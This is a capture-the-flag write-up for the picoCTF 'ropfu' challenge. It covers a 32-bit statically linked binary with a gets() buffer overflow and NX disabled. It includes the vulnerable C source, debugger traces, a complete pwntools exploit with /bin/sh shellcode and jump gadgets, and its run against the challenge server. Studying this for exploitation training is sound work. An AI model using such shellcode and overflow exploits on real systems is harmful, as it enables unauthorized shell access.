### ropfu

Download the files and run `file vuln`.

```bash
➜  ropfu git:(main) ✗ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=232215a502491a549a155b1a790de97f0c433482, for GNU/Linux 3.2.0, not stripped
```

We see that this binary is `statically linked`, meaning we cannot perform `ret2libc` attack. Also, there will be many gadgets in the binary that will help us perform a `ROP chain`.

Taking a look at the `.c`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

It's a typical buffer overflow. Running `checksec` to see the protections.

```bash
gef➤  checksec
[+] checksec for '/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/ropfu/vuln'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✓ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

We are more than lucky because `NX` is disabled. The only problem is the `Canary`. Well, if we try to overwrite the canary, we get this.

```gdb
0xffffd020│+0x0000: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"	 ← $esp
0xffffd024│+0x0004: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffd028│+0x0008: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffd02c│+0x000c: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffd030│+0x0010: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffd034│+0x0014: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaza[...]"
0xffffd038│+0x0018: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
0xffffd03c│+0x001c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabca[...]"
───────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
───────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x61616168 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip
[+] Searching for '$eip'
[+] Found at offset 28 (little-endian search) likely
[+] Found at offset 25 (big-endian search) 
```

The canary seems to be a scam. The program did not terminate after we overflow the buffer. This is probably because of the `return gets(buf)`. Well, now we also have an overflow offset at `28` bytes.

Sending a sequence of `AAAABBBBCCCCDDDDEEEEFFFFGGGG`, we will see the stack layout and the registers.

Right before `ret`, the registers are like this:

```gdb
$eax   : 0xffffd000  →  "AAAABBBBCCCCDDDDEEEEFFFFGGG"
$ebx   : 0x46464646 ("FFFF"?)
$ecx   : 0x80e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah
$edx   : 0xffffd01b  →  0x049e1a00
$esp   : 0xffffd000  →  "AAAABBBBCCCCDDDDEEEEFFFFGGG"
$ebp   : 0xffffd018  →  0x474747 ("GGG"?)
```

* `eax` contains the start of the buffer (where we can enter our payload)
* `esp` the same
* `ebp` the last bytes of our payload (I entered less `G` so the program would not terminate).

The exploitation path is to:

* Fill the buffer with the `jmp esp` opcode and `nop-slides`.
* `jmp eax` to execute it.
* Fill `esp` with our shellcode to execute it after `jmp esp`.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'i386'

r = remote('saturn.picoctf.net', 58385)

sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload  = b'\xff\xe4' # jmp esp opcode
payload += b'\x90'*(0x1c - 2) 
payload += p32(0x0805333b) # jmp eax
payload += sc # our shellcode

r.sendline(payload)
pause(1)
r.recvline()
r.sendline('cat flag.txt')
success(f'Flag --> {r.recvuntil("}").strip().decode()}')
```

```bash
➜  ropfu git:(main) ✗ python solver.py
[+] Opening connection to saturn.picoctf.net on port 58385: Done
[+] Waiting: Done
[+] Flag --> picoCTF{XXX}
[*] Closed connection to saturn.picoctf.net port 58385
```



